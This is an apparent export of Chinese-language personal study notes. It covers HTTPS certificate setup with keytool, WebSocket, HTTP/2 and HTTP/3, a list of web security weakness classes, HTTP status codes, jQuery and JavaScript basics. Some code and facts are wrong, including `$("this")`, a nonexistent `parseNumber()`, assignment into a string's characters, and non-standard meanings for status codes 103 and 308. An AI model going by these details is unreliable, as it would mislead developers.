<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务器证书 ： alias 别名, keystore 证书存放位置, validity 证书过期时间, sigalg 签名算法</span></span><br><span class="line">keytool -genkey -v -<span class="built_in">alias</span> tomcat -keyalg RSA -keystore /usr/java/tomcat.keystore -validity 36500 -sigalg SHA256withRSA</span><br><span class="line"><span class="comment"># 输入：密码，六位</span></span><br><span class="line"><span class="comment"># 输入：网站信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端证书</span></span><br><span class="line">keytool -keystore tomcat.keystore -<span class="built_in">export</span> -<span class="built_in">alias</span> tomcat -file tomcat.cer</span><br><span class="line"><span class="comment"># 输入：密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再配置Web服务器添加HTTPS证书 tomcat.keystore</span></span><br><span class="line"><span class="comment"># 再为客户端安装证书 tomcat.cer</span></span><br></pre></td></tr></table></figure>

<h1 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h1><p>过去采用Ajax，Long Poll等方式同步数据。</p>
<p>WebSocket建立时，请求发送协议升级请求，同时给出Websocket-Key，通信协议(chat, superchat)，版本号。服务器会返回响应。</p>
<h1 id="HTTP2"><a href="#HTTP2" class="headerlink" title="HTTP2"></a>HTTP2</h1><p>SPDY，用于TLS与HTTP之间，用来提速网络。SPDY会多路复用，请求优化。服务器也会主动推送。压缩了HTTP头，强制使用SSL。</p>
<p>HTTP2是基于SPDY设计的。最特色的功能是采用二进制传输而非文本传输，数据采用分帧发送。同时会压缩首部，且双方各维护一份首部表，一般会只发送更新的部分。也采用了多路复用。可以并行交错发送数据。流设置优先级，高优先级的流(css, js)先发送，优先级不是绝对的。服务器还会主动推送，例如主动推送CSS, JS文件。</p>
<h1 id="WebDAV"><a href="#WebDAV" class="headerlink" title="WebDAV"></a>WebDAV</h1><p>基于WWW的分布式文件系统。支持在线打开，编辑，映射为本地的硬盘。</p>
<h1 id="HTTP3"><a href="#HTTP3" class="headerlink" title="HTTP3"></a>HTTP3</h1><p>基于QUIC协议发展，而QUIC底层使用UDP。HTTP 2.0有队头阻塞，握手延迟大问题。</p>
<p>QUIC不使用(IP, PORT)识别对方，而是采用ID的方式，这在移动端更适用。</p>
<p>QUIC采用前向纠错。</p>
<h1 id="Web-安全"><a href="#Web-安全" class="headerlink" title="Web 安全"></a>Web 安全</h1><p>安全问题</p>
<ul>
<li>Authentication 验证</li>
<li>Authorization 授权</li>
<li>客户端攻击</li>
<li>远程执行</li>
<li>信息泄露</li>
<li>逻辑问题</li>
</ul>
<p>漏洞分类</p>
<ul>
<li>注入：SQL NOSQL OS LDAP </li>
<li>失效身份验证，破译密码，密钥等</li>
<li>敏感数据泄露</li>
<li>XXE 利用XML外部实体窃取内部文件，执行远程代码</li>
<li>失效的访问控制</li>
<li>安全配置错误：默认设置，不完整的配置等</li>
<li>XSS 跨站攻击</li>
<li>不安全的反序列化</li>
<li>含有漏洞的组件</li>
<li>不足的日志记录和监控（必须含有6个月的日志）</li>
</ul>
<p>安全机制</p>
<ul>
<li>验证机制，登录</li>
<li>会话管理，SESSION </li>
<li>访问控制，API接口</li>
</ul>
<h1 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h1><p>方案：输入用户名密码，使用SSL，限制登录等。</p>
<p>双因子认证：个人密码 + 手机验证码。</p>
<p>忘记密码：需要身份验证。邮箱找回密码，负载要加密。</p>
<p>多阶登录机制并不安全。</p>
<h1 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h1><p>服务器在用户登录后签发一个令牌，并为令牌签名。</p>
<p>应当适当终止会话，过期Session。</p>
<h1 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h1><h2 id="1xx：信息"><a href="#1xx：信息" class="headerlink" title="1xx：信息"></a>1xx：信息</h2><p>100 Continue：服务器仅接收到部分请求，但是一旦服务器并没有拒绝该请求，客户端应该继续发送其余的请求。<br>101 Switching Protocols：服务器转换协议：服务器将遵从客户的请求转换到另外一种协议。<br>103 Checkpoint：用于 PUT 或者 POST 请求恢复失败时的恢复请求建议。</p>
<h2 id="2xx：成功"><a href="#2xx：成功" class="headerlink" title="2xx：成功"></a>2xx：成功</h2><p>200 OK：请求成功（这是对HTTP请求成功的标准应答。）<br>201 Created：请求被创建完成，同时新的资源被创建。<br>202 Accepted：供处理的请求已被接受，但是处理未完成。<br>203 Non-Authoritative Information：请求已经被成功处理，但是一些应答头可能不正确，因为使用的是其他文档的拷贝。<br>204 No Content：请求已经被成功处理，但是没有返回新文档。浏览器应该继续显示原来的文档。如果用户定期地刷新页面，而Servlet可以确定用户文档足够新，这个状态代码是很有用的。<br>205 Reset Content：请求已经被成功处理，但是没有返回新文档。但浏览器应该重置它所显示的内容。用来强制浏览器清除表单输入内容。<br>206 Partial Content：客户发送了一个带有Range头的GET请求，服务器完成了它。</p>
<h2 id="3xx：重定向"><a href="#3xx：重定向" class="headerlink" title="3xx：重定向"></a>3xx：重定向</h2><p>300 Multiple Choices：多重选择。链接列表。用户可以选择某链接到达目的地。最多允许五个地址。<br>301 Moved Permanently：所请求的页面已经转移至新的 URL 。<br>302 Found：所请求的页面已经临时转移至新的 URL 。<br>303 See Other：所请求的页面可在别的 URL 下被找到。<br>304 Not Modified：未按预期修改文档。客户端有缓冲的文档并发出了一个条件性的请求（一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用。<br>305 Use Proxy：客户请求的文档应该通过Location头所指明的代理服务器提取。<br>306 Switch Proxy：目前已不再使用，但是代码依然被保留。<br>307 Temporary Redirect：被请求的页面已经临时移至新的 URL 。<br>308 Resume Incomplete：用于 PUT 或者 POST 请求恢复失败时的恢复请求建议。</p>
<h2 id="4xx：客户端错误"><a href="#4xx：客户端错误" class="headerlink" title="4xx：客户端错误"></a>4xx：客户端错误</h2><p>400 Bad Request：因为语法错误，服务器未能理解请求。<br>401 Unauthorized：合法请求，但对被请求页面的访问被禁止。因为被请求的页面需要身份验证，客户端没有提供或者身份验证失败。<br>402 Payment Required：此代码尚无法使用。<br>403 Forbidden：合法请求，但对被请求页面的访问被禁止。<br>404 Not Found：服务器无法找到被请求的页面。<br>405 Method Not Allowed：请求中指定的方法不被允许。<br>406 Not Acceptable：服务器生成的响应无法被客户端所接受。<br>407 Proxy Authentication Required：用户必须首先使用代理服务器进行验证，这样请求才会被处理。<br>408 Request Timeout：请求超出了服务器的等待时间。<br>409 Conflict：由于冲突，请求无法被完成。<br>410 Gone：被请求的页面不可用。<br>411 Length Required：”Content-Length” 未被定义。如果无此内容，服务器不会接受请求。<br>412 Precondition Failed：请求中的前提条件被服务器评估为失败。<br>413 Request Entity Too Large：由于所请求的实体太大，服务器不会接受请求。<br>414 Request-URI Too Long：由于 URL 太长，服务器不会接受请求。当 POST 请求被转换为带有很长的查询信息的 GET 请求时，就会发生这种情况。<br>415 Unsupported Media Type：由于媒介类型不被支持，服务器不会接受请求。<br>416 Requested Range Not Satisfiable：客户端请求部分文档，但是服务器不能提供被请求的部分。<br>417 Expectation Failed：服务器不能满足客户在请求中指定的请求头。</p>
<h2 id="5xx：服务器错误"><a href="#5xx：服务器错误" class="headerlink" title="5xx：服务器错误"></a>5xx：服务器错误</h2><p>500 Internal Server Error：请求未完成。服务器遇到不可预知的情况。<br>501 Not Implemented：请求未完成。服务器不支持所请求的功能，或者服务器无法完成请求。<br>502 Bad Gateway：请求未完成。服务器充当网关或者代理的角色时，从上游服务器收到一个无效的响应。<br>503 Service Unavailable：服务器当前不可用（过载或者当机）。<br>504 Gateway Timeout：网关超时。服务器充当网关或者代理的角色时，未能从上游服务器收到一个及时的响应。<br>505 HTTP Version Not Supported：服务器不支持请求中指明的HTTP协议版本。<br>511 Network Authentication Required：用户需要提供身份验证来获取网络访问入口。</p>
<h1 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h1>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>JQuery</title>
    <url>/2020/02/19/%E5%89%8D%E7%AB%AF/JQuery/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h1 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h1><p>$(selector).action() 形式。</p>
<p>入口函数如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 元素选择器</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>)</span><br><span class="line"><span class="comment">// ID选择器</span></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>)</span><br><span class="line"><span class="comment">// 类选择器</span></span><br><span class="line">$(<span class="string">&quot;.test&quot;</span>)</span><br><span class="line"><span class="comment">// 当前标签</span></span><br><span class="line">$(<span class="string">&quot;this&quot;</span>)</span><br><span class="line"><span class="comment">// 属性选择器</span></span><br><span class="line">$(<span class="string">&quot;[href]&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 动作触发后执行的代码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>常见有：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">click</span>()</span><br><span class="line"><span class="title function_">dblclick</span>()</span><br><span class="line"><span class="title function_">mouseenter</span>()</span><br><span class="line"><span class="title function_">mouseleave</span>()</span><br><span class="line"><span class="title function_">hover</span>()</span><br><span class="line"></span><br><span class="line"><span class="title function_">keypress</span>()</span><br><span class="line"><span class="title function_">keydown</span>()</span><br><span class="line"><span class="title function_">keyup</span>()</span><br><span class="line"></span><br><span class="line"><span class="title function_">submit</span>()</span><br><span class="line"><span class="title function_">change</span>()</span><br><span class="line"><span class="title function_">focus</span>()</span><br><span class="line"><span class="title function_">blur</span>()</span><br><span class="line"></span><br><span class="line"><span class="title function_">load</span>()</span><br><span class="line"><span class="title function_">resize</span>()</span><br><span class="line"><span class="title function_">scroll</span>()</span><br><span class="line"><span class="title function_">unload</span>()</span><br></pre></td></tr></table></figure>

<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 显示与隐藏</span></span><br><span class="line"><span class="title function_">hide</span>(speed, callback)</span><br><span class="line"><span class="title function_">show</span>(speed, callback)</span><br><span class="line"><span class="title function_">toggle</span>(speed,callback)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 渐入渐出</span></span><br><span class="line"><span class="title function_">fadeIn</span>(speed, callback)</span><br><span class="line"><span class="title function_">fadeOut</span>(speed, callback)</span><br><span class="line"><span class="title function_">fadeToggle</span>(speed, callback)</span><br><span class="line"><span class="title function_">fadeTo</span>(speed, opacity, callback)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 滑动</span></span><br><span class="line"><span class="title function_">slideDown</span>(speed, callback)</span><br><span class="line"><span class="title function_">slideUp</span>(speed, callback)</span><br><span class="line"><span class="title function_">slideToggle</span>(speed, callback)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动画</span></span><br><span class="line"><span class="title function_">animate</span>(&#123;params&#125;,speed,callback)</span><br><span class="line"><span class="title function_">stop</span>(stopAll,goToEnd);</span><br><span class="line"><span class="comment">// 如</span></span><br><span class="line">$(<span class="string">&quot;button&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  $(<span class="string">&quot;div&quot;</span>).<span class="title function_">animate</span>(&#123;</span><br><span class="line">    <span class="attr">left</span>:<span class="string">&#x27;250px&#x27;</span>,</span><br><span class="line">    <span class="attr">height</span>:<span class="string">&#x27;+=150px&#x27;</span>,</span><br><span class="line">    <span class="attr">width</span>:<span class="string">&#x27;+=150px&#x27;</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="链"><a href="#链" class="headerlink" title="链"></a>链</h1><p>函数可以链式调用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#p1&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>).<span class="title function_">slideUp</span>(<span class="number">2000</span>).<span class="title function_">slideDown</span>(<span class="number">2000</span>);</span><br></pre></td></tr></table></figure>

<h1 id="DOM-操作"><a href="#DOM-操作" class="headerlink" title="DOM 操作"></a>DOM 操作</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">text</span>()</span><br><span class="line"><span class="title function_">html</span>()</span><br><span class="line"><span class="title function_">val</span>()</span><br><span class="line"><span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>) <span class="comment">// 读取</span></span><br><span class="line"><span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>, value) <span class="comment">// 写入</span></span><br><span class="line">attr&#123;</span><br><span class="line">    <span class="string">&quot;href&quot;</span>: val,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: tit</span><br><span class="line">&#125; <span class="comment">// 写入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用回调</span></span><br><span class="line">$(<span class="string">&quot;#btn1&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#test1&quot;</span>).<span class="title function_">text</span>(<span class="keyword">function</span>(<span class="params">i,origText</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;旧文本: &quot;</span> + origText + <span class="string">&quot; 新文本: Hello world! (index: &quot;</span> + i + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;button&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  $(<span class="string">&quot;#runoob&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>, <span class="keyword">function</span>(<span class="params">i,origValue</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> origValue + <span class="string">&quot;/jquery&quot;</span>; </span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>插入元素内容</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">append</span>(<span class="string">&quot;追加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">prepend</span>(<span class="string">&quot;在开头追加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).<span class="title function_">after</span>(<span class="string">&quot;在后面添加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).<span class="title function_">before</span>(<span class="string">&quot;在前面添加文本&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>删除元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#div1&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).<span class="title function_">empty</span>();</span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).<span class="title function_">remove</span>(<span class="string">&quot;.italic&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>使用Data</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f1 = $(<span class="variable language_">this</span>).<span class="title function_">data</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> f2 = $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;data-id&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="CSS-操作"><a href="#CSS-操作" class="headerlink" title="CSS 操作"></a>CSS 操作</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 给标签添加几个类</span></span><br><span class="line"><span class="title function_">addClass</span>()</span><br><span class="line"><span class="title function_">removeClass</span>()</span><br><span class="line"><span class="title function_">toggleClass</span>()</span><br><span class="line"><span class="comment">// 返回样式设置</span></span><br><span class="line"><span class="title function_">css</span>(<span class="string">&quot;background-color&quot;</span>, <span class="string">&quot;red&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="尺寸"><a href="#尺寸" class="headerlink" title="尺寸"></a>尺寸</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">width</span>()   <span class="comment">// Element</span></span><br><span class="line"><span class="title function_">height</span>()</span><br><span class="line"><span class="title function_">innerWidth</span>()  <span class="comment">// Padding</span></span><br><span class="line"><span class="title function_">innerHeight</span>()</span><br><span class="line"><span class="title function_">outerWidth</span>()    <span class="comment">// border</span></span><br><span class="line"><span class="title function_">outerHeight</span>(<span class="literal">true</span>)   <span class="comment">// Margin</span></span><br></pre></td></tr></table></figure>

<h1 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">parent</span>()</span><br><span class="line"><span class="title function_">parents</span>()</span><br><span class="line"><span class="title function_">parentsUntil</span>()</span><br><span class="line"><span class="title function_">children</span>()</span><br><span class="line"><span class="title function_">find</span>()</span><br><span class="line"><span class="title function_">find</span>(<span class="string">&quot;*&quot;</span>)</span><br><span class="line"><span class="title function_">siblings</span>()</span><br><span class="line"><span class="title function_">next</span>()</span><br><span class="line"><span class="title function_">nextAll</span>()</span><br><span class="line"><span class="title function_">nextUntil</span>()</span><br><span class="line"><span class="title function_">prev</span>()</span><br><span class="line"><span class="title function_">prevAll</span>()</span><br><span class="line"><span class="title function_">prevUntil</span>()</span><br></pre></td></tr></table></figure>

<p>遍历后还可以过滤：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">first</span>()</span><br><span class="line"><span class="title function_">last</span>()</span><br><span class="line"><span class="title function_">eq</span>()</span><br><span class="line"><span class="title function_">filter</span>()</span><br><span class="line"><span class="title function_">not</span>()</span><br></pre></td></tr></table></figure>

<h1 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h1><p>load 方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(selector).<span class="title function_">load</span>(<span class="variable constant_">URL</span>,data,callback);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).<span class="title function_">load</span>(<span class="string">&quot;demo_test.txt&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).<span class="title function_">load</span>(<span class="string">&quot;demo_test.txt #p1&quot;</span>);  <span class="comment">// 送入p1中</span></span><br><span class="line">$(<span class="string">&quot;button&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  $(<span class="string">&quot;#div1&quot;</span>).<span class="title function_">load</span>(<span class="string">&quot;demo_test.txt&quot;</span>,<span class="keyword">function</span>(<span class="params">responseTxt,statusTxt,xhr</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(statusTxt==<span class="string">&quot;success&quot;</span>)</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;外部内容加载成功!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(statusTxt==<span class="string">&quot;error&quot;</span>)</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;Error: &quot;</span>+xhr.<span class="property">status</span>+<span class="string">&quot;: &quot;</span>+xhr.<span class="property">statusText</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>get与post：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">get</span>(<span class="string">&quot;demo_test.php&quot;</span>,<span class="keyword">function</span>(<span class="params">data,status</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;数据: &quot;</span> + data + <span class="string">&quot;\n状态: &quot;</span> + status);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$.<span class="title function_">post</span>(<span class="string">&quot;/try/ajax/demo_test_post.php&quot;</span>,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;菜鸟教程&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://www.runoob.com&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="keyword">function</span>(<span class="params">data,status</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;数据: \n&quot;</span> + data + <span class="string">&quot;\n状态: &quot;</span> + status);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ajax方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;demo_test.txt&quot;</span>,</span><br><span class="line">    <span class="attr">async</span>:<span class="literal">true</span>,  <span class="comment">// 是否异步，默认是</span></span><br><span class="line">    <span class="attr">contentType</span>:<span class="string">&quot;&quot;</span>,  </span><br><span class="line">    <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">result</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#div1&quot;</span>).<span class="title function_">html</span>(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h1 id="jQuery-参考"><a href="#jQuery-参考" class="headerlink" title="jQuery 参考"></a>jQuery 参考</h1><p><a href="https://www.runoob.com/jquery/jquery-ref-selectors.html">选择器</a></p>
<p><a href="https://www.runoob.com/jquery/jquery-ref-events.html">事件方法</a></p>
<p><a href="https://www.runoob.com/jquery/jquery-ref-effects.html">效果</a></p>
<p><a href="https://www.runoob.com/jquery/jquery-ref-html.html">HTML&#x2F;CSS</a></p>
<p><a href="https://www.runoob.com/jquery/jquery-ref-traversing.html">遍历</a></p>
<p><a href="https://www.runoob.com/jquery/jquery-ref-ajax.html">AJAX</a></p>
<p><a href="https://www.runoob.com/jquery/jquery-ref-misc.html">其他</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>JQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript</title>
    <url>/2020/02/19/%E5%89%8D%E7%AB%AF/Javascript/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="常用输出方式"><a href="#常用输出方式" class="headerlink" title="常用输出方式"></a>常用输出方式</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 系统提示框，阻塞</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>()</span><br><span class="line"><span class="comment">// 写到HTML，如果文档加载完成后执行，则会覆盖整个页面</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>()</span><br><span class="line"><span class="comment">// 输出到HTML中</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">// 输出到控制台</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>()</span><br></pre></td></tr></table></figure>

<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>值类型包含 - 字符串，数字，布尔，空，未定义，Symbol。<br>引用类型包含 - 对象，数组，函数。</p>
<h1 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> y = <span class="literal">null</span>;  <span class="comment">// y 被清理</span></span><br><span class="line"><span class="keyword">var</span> x;  <span class="comment">// undefined，x不含有值</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;  </span><br><span class="line"><span class="keyword">var</span> x = <span class="number">34.00</span>;</span><br><span class="line"><span class="keyword">var</span> x = <span class="title class_">Infinity</span>; <span class="comment">// 无穷大</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">123e5</span>;</span><br><span class="line"><span class="keyword">var</span> x = <span class="number">100</span> / <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="built_in">isNaN</span>(x)  <span class="comment">// true，非数值，但是 NaN === NaN =&gt; false</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;John&quot;</span>; </span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&#x27;John&#x27;</span>;      </span><br><span class="line"><span class="keyword">var</span> x = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> x = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<p>运算符：</p>
<ul>
<li>加减乘除</li>
<li>取余</li>
<li>自增</li>
<li>自减</li>
<li>等于</li>
<li>绝对等于，包含类型检查</li>
<li>不等于</li>
<li>绝对不等于</li>
<li>比较运算</li>
<li>与或非</li>
</ul>
<h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><p>常量：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="property">E</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="property">PI</span></span><br></pre></td></tr></table></figure>

<p>方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">random</span>()</span><br><span class="line"><span class="title function_">round</span>()</span><br><span class="line"><span class="title function_">max</span>()</span><br><span class="line"><span class="title function_">min</span>()</span><br></pre></td></tr></table></figure>

<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 访问字符串的字符</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&quot;John&quot;</span>; </span><br><span class="line">x[<span class="number">0</span>] = <span class="string">&#x27;K&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串长度</span></span><br><span class="line">x.<span class="property">length</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 转为对象</span></span><br><span class="line"><span class="keyword">var</span> y = <span class="keyword">new</span> <span class="title class_">String</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 属性</span></span><br><span class="line">length;     <span class="comment">// 字符串长度</span></span><br><span class="line">constructor <span class="comment">// 构造函数</span></span><br><span class="line">prototype   <span class="comment">// 向对象添加属性和方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法</span></span><br><span class="line"><span class="title function_">concat</span>()    <span class="comment">// 连接字符串</span></span><br><span class="line"><span class="title function_">charCodeAt</span>()<span class="comment">// 返回Unicode</span></span><br><span class="line"><span class="title function_">indexOf</span>()   <span class="comment">// 返回索引</span></span><br><span class="line"><span class="title function_">lastIndexOf</span>() <span class="comment">// 返回索引</span></span><br><span class="line"><span class="title function_">match</span>()     <span class="comment">// 匹配 正则表达式</span></span><br><span class="line"><span class="title function_">search</span>()    <span class="comment">// 搜索 正则表达式</span></span><br><span class="line"><span class="title function_">replace</span>()   <span class="comment">// 替换 正则表达式</span></span><br><span class="line"><span class="title function_">slice</span>()     <span class="comment">// 取几个字符</span></span><br><span class="line"><span class="title function_">split</span>()     <span class="comment">// 分割</span></span><br><span class="line"><span class="title function_">substr</span>()    <span class="comment">// 子串</span></span><br><span class="line"><span class="title function_">substring</span>() <span class="comment">// 子串</span></span><br><span class="line"><span class="title function_">trim</span>()      <span class="comment">// 去空格</span></span><br><span class="line"><span class="title function_">toString</span>()  <span class="comment">// 转为普通字符串</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.runoob.com/js/js-strings.html">字符串参考</a></p>
<h1 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h1><h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a.<span class="title function_">toString</span>()</span><br><span class="line"><span class="comment">// null, undefined 不能用</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">String</span>(<span class="number">123</span>)</span><br><span class="line"><span class="comment">// 都可以用</span></span><br></pre></td></tr></table></figure>

<h2 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Number</span>()</span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&quot;123&quot;</span>, <span class="number">10</span>)</span><br><span class="line"><span class="title function_">parseNumber</span>()</span><br></pre></td></tr></table></figure>

<h2 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean"></a>Boolean</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Boolean</span>()</span><br><span class="line"><span class="comment">// 0 Nan &quot;&quot; null undefined 都是 false</span></span><br></pre></td></tr></table></figure>

